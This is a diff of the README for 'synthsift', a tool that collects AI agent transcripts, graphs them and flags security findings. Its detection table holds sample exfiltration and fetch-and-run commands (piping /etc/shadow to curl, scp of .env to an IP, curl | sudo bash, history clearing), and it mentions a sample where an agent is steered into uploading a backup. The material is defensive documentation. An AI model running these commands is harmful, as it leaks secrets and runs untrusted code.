@@ -27,6 +27,7 @@ node, and **Timeline**, everything tagged plus the findings, row by row.
 uv run synthsift --open                     # web UI on http://127.0.0.1:8765
 uv run synthsift serve --load samples/synthsift-samples.zip --open
 uv run synthsift build my-transcripts.zip -o graph.html   # standalone pyvis HTML, no server
+uv run synthsift collect -o mine.zip        # zip this machine's Claude Code + OpenClaw sessions
 uv run synthsift harnesses                  # list transcript parsers
 ```
 
@@ -42,7 +43,7 @@ Upload one or more `.zip` files (button, or drag & drop anywhere):
 upload.zip
 └── <host>/
     └── <user>/
-        └── <harness>/                 example | claude_code | gemini | antigravity | hermes | openclaw
+        └── <harness>/                 claude_code | openclaw | example | gemini | antigravity | hermes
             ├── transcript1-xyz.json
             └── transcript2-abc.jsonl
 ```
@@ -51,6 +52,35 @@ Extra wrapper folders above `host/` are ignored, and sub-folders below the
 harness folder become part of the session name. When the harness folder isn't
 recognised, each implemented parser gets to *sniff* the file instead. One file
 is one session and may hold several conversations.
+
+Agent state folders can be zipped as they are: `.claude/` and `.openclaw/`
+are recognised even though they are hidden. If there is no `host/user` above
+them, the user is taken from the session's working directory.
+
+### Importing Claude Code and OpenClaw
+
+`synthsift collect` finds both agents' transcripts on a machine and writes an
+upload-ready zip (`<host>/<user>/<harness>/…`). It never modifies anything:
+
+```bash
+uv run synthsift collect -o laptop.zip            # your own sessions
+sudo uv run synthsift collect --all-users -o ir.zip   # every home directory
+uv run synthsift collect --since-days 7 --dry-run  # list what would be taken
+```
+
+| | Claude Code | OpenClaw |
+|---|---|---|
+| **Where** | `~/.claude/projects/<project>/<session>.jsonl`, sub-agents in `<session>/subagents/agent-*.jsonl` (`$CLAUDE_CONFIG_DIR`) | `~/.openclaw/agents/<agent>/agent/openclaw-agent.sqlite` (current), `…/sessions/*.jsonl` (older releases), `*.jsonl.deleted.*` / `*.jsonl.reset.*` archives and `sessions/cold/*.jsonl.zst` (`$OPENCLAW_STATE_DIR`; `~/.clawdbot` and `~/.moltbot` are searched too) |
+| **Messages** | Streamed response rows are merged back into one message; tool results are linked to their calls; `<system-reminder>`, meta and compaction-summary rows become *system* messages | User, assistant and tool-result events; compaction, branch-summary and reset markers become *system* messages |
+| **Tool calls** | `Bash`, `Read`, `Write`, `Edit`, `WebFetch`, `Task`, MCP tools … with their full input | `exec`, `read`, `write`, `web_fetch`, `message`, `cron` … with their arguments |
+| **Things people do themselves** | `!` bash-mode commands become `user_shell` tool calls (and are security-scanned); slash commands keep their arguments; prompts queued while the agent was busy are kept | `bashExecution` entries become `user_shell` tool calls; messages another agent session sent in are marked `inter_session` |
+| **Sub-agents** | Each sub-agent is its own conversation, whether it was written to its own file or interleaved in the session file | Separate sessions |
+| **Metadata** | Title (`/rename` > AI title > summary), working directory, git branch, CLI version, models | Channel and chat type, session key, display name / label, models, and whether the session was **deleted** or **reset** (archives are read, including deleted sessions kept inside the database) |
+
+Live files are fine. Claude Code transcripts copied mid-write lose only the
+cut-off last line. `collect` snapshots OpenClaw's SQLite database with the
+online backup API. A copied database with its `-wal` file next to it in the
+zip is also read, including the not-yet-checkpointed rows.
 
 ## Using the UI
 
@@ -66,6 +96,7 @@ the others, including in other tabs.
 | **Graph** | Click a node to list every paragraph it appears in (or jump straight to it if there's only one). Hovering a node shows the paragraph with the word highlighted. Double-click zooms. |
 | **Top search** | Searches words across all visible transcripts (plain text or `/regex/i`). Matching nodes get a halo, everything else fades, and the Matches tab lists the hits. Press <kbd>Enter</kbd> to zoom to them and <kbd>/</kbd> to focus the search box. |
 | **Conversations panel** | **Host / user / agent filters** narrow the whole workspace (graph, transcript, findings, and the Nodes and Timeline pages). Below them, a tree of host › user › harness › conversation: checkboxes toggle visibility per conversation or per group. Its own search box counts matching paragraphs per conversation; the filter button shows only those conversations. Clicking a conversation opens its transcript and fits the graph to it. |
+| **Conversation chips** | Under the conversation picker: host, user, agent, model, file, plus the channel, session key, working directory, git branch, sub-agent and deleted/reset state when the agent recorded them. |
 | **Transcript / Matches** | Shows the full conversation (user bubbles, italic dashed thoughts, tool-call cards with arguments, collapsible results) or the matching paragraphs. **# before / # after** set how many paragraphs of context surround each match. Underlined words are extracted entities; clicking one selects its node. |
 | **Security tab** | Findings grouped by severity and category, each with its `source → action → sink` chain and where it happened. Click one to jump to the turn. **Flagged** (graph toolbar) fades everything without a finding; flagged nodes carry a severity ring and dataflow edges are drawn bold. |
 | **Tagging** | Right-click a node, a transcript turn, an underlined term, a finding or a conversation in the tree to tag it **bad / suspicious / seen / ignore** or a custom tag, and to add a comment. The selection card has one-click tag checkboxes too. Tag chips in the left panel fade untagged nodes; *Hide ignored* removes `ignore`d items from the graph. |
@@ -138,7 +169,7 @@ where data moves rather than shipping a list of named tools:
 
 | Signal | Example | Severity |
 |---|---|---|
-| **Outbound / exfiltration**: local data, a secret or bulk query output sent to a URL, domain, IP, host or bucket | `cat /etc/shadow \| curl -X POST --data-binary @- https://x.example`, `aws s3 cp dump.sql s3://…`, `scp .env ops@203.0.113.9:`, `pg_dump db \| curl -T - …` | high, or critical when a secret is involved |
+| **Outbound / exfiltration**: local data, a secret or bulk query output sent to a URL, domain, IP, host or bucket | `cat /etc/shadow \| curl -X POST --data-binary @- https://x.example`, `curl -T backup.tar.gz https://…`, `curl -F 'file=@app.log' https://…`, `aws s3 cp dump.sql s3://…`, `scp .env ops@203.0.113.9:`, `pg_dump db \| curl -T - …` | high, or critical when a secret is involved |
 | **Inbound download** to disk | `curl https://… -o /tmp/tool.sh` | medium |
 | **Fetch-and-run** | `curl https://…/x.sh \| sudo bash` | high |
 | **Exposed secret** in a message, argument or tool output (shown redacted) | private-key headers, cloud keys, tokens, `password=` | medium to critical |
@@ -147,10 +178,24 @@ where data moves rather than shipping a list of named tools:
 | **Log / history clearing** | `history -c`, truncating `/var/log/*` | high |
 | **Watchlist** | your own patterns (Settings → Security analysis) | you choose |
 
-Localhost, `/dev/null` and plain fetches without a write are ignored to keep
-the noise down. Each finding records the conversation, turn and the entities
-involved; chains become `dataflow` edges in the graph. The data-loss sample
-(`ci-runner-3/jordan`) shows most of them.
+Only the command itself is analysed. Several things are treated as data and
+ignored, which keeps coding-agent logs quiet:
+- here-document bodies fed to a non-shell program (the Python script in
+  `python - <<EOF`);
+- file contents written by `Write`/`Edit`-style tools;
+- tool descriptions;
+- upload flags on programs that aren't HTTP clients (`grep -F`, `cut -d`).
+
+Localhost, `/dev/null`, plain fetches without a write, and
+`curl … | python -c '…'` (stdin is data, not code) are ignored too.
+
+Each finding records the conversation, turn and the entities involved; chains
+become `dataflow` edges in the graph. The samples that show most signals are:
+- the data-loss sample (`ci-runner-3/jordan`);
+- the Claude Code session that uploads a log to a paste site
+  (`devbox-02/priya`);
+- the OpenClaw group chat where a channel member steers the agent into
+  uploading a backup (`home-server/max`).
 
 Analyst tags and comments are stored in `annotations.json` in the data
 directory (`GET/PUT/DELETE /api/annotations`, `POST/DELETE /api/tags`, JSON
@@ -230,26 +275,35 @@ class MyAgentParser(HarnessParser):
         msgs = []
         for r in rows:
             if r["kind"] == "prompt":
-                msgs.append(Message("user", [Block.text_block(r["text"])]))
+                msgs.append(Message(role="user", blocks=[Block.text_block(r["text"])]))
             elif r["kind"] == "step":
-                msgs.append(Message("assistant", [
+                msgs.append(Message(role="assistant", blocks=[
                     Block.thinking(r.get("plan", "")),
                     Block.tool_call(r["tool"], r["args"], r["id"]),
                 ]))
             elif r["kind"] == "observation":
-                msgs.append(Message("tool", [Block.tool_result(r["output"], r["id"])]))
+                msgs.append(Message(role="tool", blocks=[Block.tool_result(r["output"], r["id"])]))
         return [Conversation(messages=msgs)]
 
     def sniff(self, raw: bytes, filename: str) -> float:   # optional
         return 0.9 if b'"kind": "prompt"' in raw[:2000] else 0.0
 ```
 
-`example.py` is the complete reference implementation. It also reads OpenAI
+`example.py` is the simplest complete implementation. It also reads OpenAI
 chat-completions logs and Anthropic Messages logs, so it's a good base to copy.
-`claude_code.py`, `gemini.py`, `antigravity.py`, `hermes.py` and `openclaw.py`
-are registered placeholders: files in those folders are skipped with a
-warning until the parser is written. Each one's docstring has notes on the
+`claude_code.py` (JSONL rows) and `openclaw.py` (JSONL events, zstd archives
+and SQLite) are full real-world parsers. Their module docstrings describe each
 native format.
+
+`gemini.py`, `antigravity.py` and `hermes.py` are registered placeholders:
+files in those folders are skipped with a warning until the parser is written.
+
+The base class also gives parsers:
+- `read_jsonl()`: tolerant of a cut-off last line.
+- `decompress()`: for `.zst` and `.gz` files.
+- `iso_time()`: converts epoch seconds or milliseconds to ISO time.
+- `self.companions`: sibling files from the upload, such as a SQLite `-wal`.
+- `self.warnings`: for messages shown to the user.
 
 ### The example format
 
